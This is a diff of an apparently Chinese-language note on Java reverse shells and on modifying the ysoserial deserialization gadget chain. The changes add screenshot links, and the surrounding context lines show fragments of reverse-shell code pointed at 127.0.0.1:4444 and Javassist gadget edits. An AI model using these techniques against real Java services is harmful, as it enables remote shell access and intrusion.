@@ -32,6 +32,7 @@ public class 10837093162496 extends AbstractTranslet {
 
 ## java 反弹shell
 
+![](./images/shell-win.png)
 ```
 String host = "127.0.0.1";
 int port = 4444;
@@ -60,6 +61,9 @@ s.close();
 
 ## ys 改造反弹shell
 
+![](./images/ys1.png)
+
+
 `https://codeload.github.com/frohoff/ysoserial/zip/master`
 
 修改 `ysoserial/payloads/util/Gadgets.java`
@@ -84,3 +88,9 @@ s.close();
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
 ```
+
+![](./images/shell-ser.png)
+![](./images/shell-java.png)
+![](./images/getshell.png)
+![](./images/gadgets.png)
+
